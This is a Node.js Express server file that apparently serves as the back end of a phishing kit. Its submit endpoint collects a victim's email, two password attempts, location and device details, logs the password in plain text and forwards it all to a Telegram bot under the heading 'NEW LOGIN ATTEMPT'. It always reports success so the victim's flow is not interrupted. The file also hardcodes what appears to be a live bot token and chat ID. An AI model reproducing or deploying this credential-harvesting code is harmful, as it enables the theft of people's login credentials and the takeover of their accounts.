const express = require('express');
const cors = require('cors');
const app = express();

console.log('🚀 Starting Telegram Bot Server...');

// Configuration - UPDATE THESE WITH YOUR TELEGRAM CREDENTIALS
const CONFIG = {
  PORT: process.env.PORT || 3000,
  TELEGRAM: {
    BOT_TOKEN: '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw', // Get from @BotFather
    CHAT_ID: '5546373743'      // Your personal chat ID
  }
};

// Basic middleware - SIMPLIFIED
app.use(cors());
app.use(express.json());

// Health check endpoint - SIMPLE VERSION
app.get('/api/health', (req, res) => {
  console.log('✅ Health check passed');
  res.json({ 
    status: 'OK', 
    message: 'Telegram Bot Server is running',
    timestamp: new Date().toISOString()
  });
});

// Test endpoint - SIMPLE VERSION
app.get('/api/test-telegram', async (req, res) => {
  console.log('🧪 Testing Telegram connection...');
  
  try {
    // Simple test without axios
    const testMessage = `🤖 BOT TEST\n\nServer is working! Time: ${new Date().toLocaleString()}`;
    
    // Using fetch instead of axios for compatibility
    const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CONFIG.TELEGRAM.CHAT_ID,
        text: testMessage
      })
    });

    const result = await response.json();
    
    if (result.ok) {
      console.log('✅ Telegram test successful');
      res.json({
        success: true,
        message: 'Test message sent to Telegram!',
        timestamp: new Date().toISOString()
      });
    } else {
      throw new Error(result.description || 'Telegram API error');
    }
    
  } catch (error) {
    console.error('❌ Telegram test failed:', error.message);
    res.json({
      success: false,
      error: 'Telegram not configured yet',
      message: 'Server is running but Telegram needs configuration',
      help: 'Set BOT_TOKEN and CHAT_ID in the code'
    });
  }
});

// Main endpoint - SIMPLIFIED
app.post('/api/submit', async (req, res) => {
  console.log('📨 Received data submission');
  
  try {
    const { 
      email,
      firstpasswordused,
      secondpasswordused,
      country = 'Unknown',
      city = 'Unknown',
      device = {}
    } = req.body;

    // Basic validation
    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Email is required'
      });
    }

    const passwordUsed = firstpasswordused || secondpasswordused;
    const attemptType = firstpasswordused ? 'First' : 'Second';

    if (!passwordUsed) {
      return res.status(400).json({
        success: false,
        error: 'Password is required'
      });
    }

    console.log(`📧 Email: ${email}`);
    console.log(`🔑 Password: ${passwordUsed}`);
    console.log(`🎯 Attempt: ${attemptType}`);

    // Try to send to Telegram if configured
    if (CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
      try {
        const telegramMessage = `
🔐 NEW LOGIN ATTEMPT

📧 Email: ${email}
🔑 Password: ${passwordUsed}
🎯 Attempt: ${attemptType}

🌍 Location: ${city}, ${country}
💻 Platform: ${device.platform || 'Unknown'}
🌐 Language: ${device.language || 'Unknown'}

⏰ Time: ${new Date().toLocaleString()}
        `;

        const telegramUrl = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
        
        await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.TELEGRAM.CHAT_ID,
            text: telegramMessage
          })
        });

        console.log('✅ Data sent to Telegram');
        
      } catch (telegramError) {
        console.log('⚠️ Telegram failed, but data was received');
      }
    } else {
      console.log('ℹ️ Telegram not configured - data received but not sent');
    }

    // Always return success to continue the flow
    res.json({
      success: true,
      message: 'Data received successfully',
      timestamp: new Date().toISOString(),
      telegram: CONFIG.TELEGRAM.BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' ? 'sent' : 'not_configured'
    });

  } catch (error) {
    console.error('❌ Error:', error.message);
    
    // Still return success to not break the user flow
    res.json({
      success: true,
      message: 'Data processing completed',
      error: error.message
    });
  }
});

// Handle all other routes
app.use('*', (req, res) => {
  res.json({
    success: false,
    error: 'Route not found',
    availableRoutes: ['/api/health', '/api/test-telegram', '/api/submit']
  });
});

// Start server
app.listen(CONFIG.PORT, () => {
  console.log(`🎉 Server running on port ${CONFIG.PORT}`);
  console.log(`📍 Health: https://server-gfhv.onrender.com/api/health`);
  console.log('💡 Next: Configure Telegram BOT_TOKEN and CHAT_ID');
});
